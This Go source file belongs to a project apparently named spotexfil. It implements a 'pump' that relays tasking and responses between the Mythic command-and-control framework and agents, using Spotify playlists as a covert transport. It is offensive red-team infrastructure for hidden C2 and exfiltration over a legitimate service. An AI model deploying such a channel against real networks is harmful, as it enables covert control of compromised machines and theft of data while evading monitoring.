// Package pump contains the pure bridge logic between Mythic tasking and the
// Spotify-playlist transport. It has no Mythic or Spotify imports: both sides
// are behind small interfaces so the pump is fully unit-testable.
//
// Channel model:
//   - "res" channel: agents write responses here, the profile polls it and
//     forwards each envelope to Mythic, then cleans the playlist.
//   - "cmd" channel: tasking from Mythic is written here (one playlist per
//     message, keyed by an incrementing seq) for agents to poll.
//
// Envelopes are opaque base64 strings (base64(UUID || blob)). The pump only
// extracts the 36-char UUID prefix via mythicmap.ExtractUUID for correlation;
// it never decrypts or parses contents.
package pump

import (
	"context"
	"fmt"
	"log"
	"sync/atomic"
	"time"

	"github.com/sourcefrenchy/spotexfil/pkg/mythicmap"
)

// Default channel names used by the transport.
const (
	DefaultCmdChannel = "cmd"
	DefaultResChannel = "res"
)

// MythicSide is the Mythic-facing half of the bridge.
type MythicSide interface {
	// SendToMythic forwards an agent envelope to Mythic. uuid is the
	// 36-char correlation ID extracted from the envelope.
	SendToMythic(uuid string, envelopeB64 string) error
	// RecvTasking blocks until Mythic produces tasking for an agent (or
	// ctx is cancelled). The returned envelope is written verbatim to the
	// cmd channel.
	RecvTasking(ctx context.Context) (uuid string, envelopeB64 string, err error)
}

// TransportSide is the Spotify-playlist-facing half of the bridge.
type TransportSide interface {
	// ReadChannel returns all reassembled envelopes on the channel,
	// keyed by their seq number.
	ReadChannel(ctx context.Context, channel string) (map[int]string, error)
	// WriteChannel writes one envelope to the channel under the given seq.
	WriteChannel(ctx context.Context, channel string, seq int, envelopeB64 string) error
	// CleanChannel removes the playlist(s) for one seq from the channel.
	CleanChannel(ctx context.Context, channel string, seq int) error
}

// ExtractUUIDFunc extracts the correlation UUID from an envelope. It is a
// field so tests can inject failures; production wiring uses
// mythicmap.ExtractUUID.
type ExtractUUIDFunc func(envelopeB64 string) (string, error)

// Config configures a Pump.
type Config struct {
	// CmdChannel is the operator->agent channel (default "cmd").
	CmdChannel string
	// ResChannel is the agent->operator channel (default "res").
	ResChannel string
	// PollInterval is how often the res channel is polled.
	PollInterval time.Duration
	// ExtractUUID overrides the UUID extractor (defaults to
	// mythicmap.ExtractUUID).
	ExtractUUID ExtractUUIDFunc
}

// Pump bridges the transport and Mythic.
type Pump struct {
	mythic       MythicSide
	transport    TransportSide
	extractUUID  ExtractUUIDFunc
	pollInterval time.Duration
	cmdChannel   string
	resChannel   string
	seq          atomic.Int64
}

// New creates a Pump. Both sides must be non-nil.
func New(m MythicSide, t TransportSide, cfg Config) (*Pump, error) {
	if m == nil || t == nil {
		return nil, fmt.Errorf("pump: MythicSide and TransportSide are required")
	}
	if cfg.CmdChannel == "" {
		cfg.CmdChannel = DefaultCmdChannel
	}
	if cfg.ResChannel == "" {
		cfg.ResChannel = DefaultResChannel
	}
	if cfg.PollInterval <= 0 {
		cfg.PollInterval = 30 * time.Second
	}
	if cfg.ExtractUUID == nil {
		cfg.ExtractUUID = mythicmap.ExtractUUID
	}
	return &Pump{
		mythic:       m,
		transport:    t,
		extractUUID:  cfg.ExtractUUID,
		pollInterval: cfg.PollInterval,
		cmdChannel:   cfg.CmdChannel,
		resChannel:   cfg.ResChannel,
	}, nil
}

// RunAgentToMythic polls the res channel and forwards agent envelopes to
// Mythic until ctx is cancelled. Envelopes whose UUID cannot be extracted are
// skipped and cleaned (they can never be correlated, so leaving them would
// just waste playlist slots). Successfully forwarded envelopes are cleaned
// from the channel. Returns nil on context cancellation.
func (p *Pump) RunAgentToMythic(ctx context.Context) error {
	ticker := time.NewTicker(p.pollInterval)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
		}
		if err := p.pollResOnce(ctx); err != nil {
			if ctx.Err() != nil {
				return nil
			}
			log.Printf("[pump] res poll error: %v", err)
		}
	}
}

// pollResOnce performs a single poll/forward/clean pass over the res channel.
func (p *Pump) pollResOnce(ctx context.Context) error {
	msgs, err := p.transport.ReadChannel(ctx, p.resChannel)
	if err != nil {
		return fmt.Errorf("read %s channel: %w", p.resChannel, err)
	}
	for seq, envelope := range msgs {
		if ctx.Err() != nil {
			return nil
		}
		uuid, err := p.extractUUID(envelope)
		if err != nil {
			log.Printf("[pump] seq %d: cannot extract UUID, skipping and cleaning: %v", seq, err)
			if cerr := p.transport.CleanChannel(ctx, p.resChannel, seq); cerr != nil {
				log.Printf("[pump] seq %d: clean after bad UUID failed: %v", seq, cerr)
			}
			continue
		}
		if err := p.mythic.SendToMythic(uuid, envelope); err != nil {
			// Leave the playlist in place so a later poll can retry.
			log.Printf("[pump] seq %d: forward to Mythic failed, will retry: %v", seq, err)
			continue
		}
		if cerr := p.transport.CleanChannel(ctx, p.resChannel, seq); cerr != nil {
			log.Printf("[pump] seq %d: clean after send failed: %v", seq, cerr)
		}
	}
	return nil
}

// RunMythicToAgent receives tasking from Mythic and writes each envelope to
// the cmd channel under an atomically-incrementing seq until ctx is
// cancelled. Returns nil on context cancellation; returns the underlying
// error if the Mythic side fails (so the caller can re-establish the stream).
func (p *Pump) RunMythicToAgent(ctx context.Context) error {
	for {
		uuid, envelope, err := p.mythic.RecvTasking(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			return fmt.Errorf("recv tasking from Mythic: %w", err)
		}
		seq := int(p.seq.Add(1) - 1)
		if err := p.transport.WriteChannel(ctx, p.cmdChannel, seq, envelope); err != nil {
			if ctx.Err() != nil {
				return nil
			}
			log.Printf("[pump] write tasking for %s (seq %d) failed: %v", uuid, seq, err)
			continue
		}
		log.Printf("[pump] tasking for %s written to %s channel seq %d", uuid, p.cmdChannel, seq)
	}
}
